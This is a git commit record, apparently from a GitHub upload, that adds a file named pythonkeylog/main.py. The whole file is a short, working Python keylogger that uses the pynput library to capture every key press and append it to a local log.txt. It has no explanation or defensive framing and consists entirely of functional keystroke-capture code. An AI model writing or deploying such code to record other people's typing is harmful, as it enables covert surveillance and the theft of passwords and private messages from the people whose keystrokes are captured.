a9ac2a991b0ca81963c0834b70270d655496b087
velpandy <145965672+velpandy@users.noreply.github.com>
2024-03-16 20:22:25 +0530

    Add files via upload

---
+++ pythonkeylog/main.py
@@ -0,0 +1,10 @@
+from pynput.keyboard import Listener
+def writetofile(key):
+    keydata=str(key)
+    with open('log.txt', 'a') as f:
+        f.write(keydata)
+
+
+
+with Listener(on_press=writetofile) as l:
+    l.join()
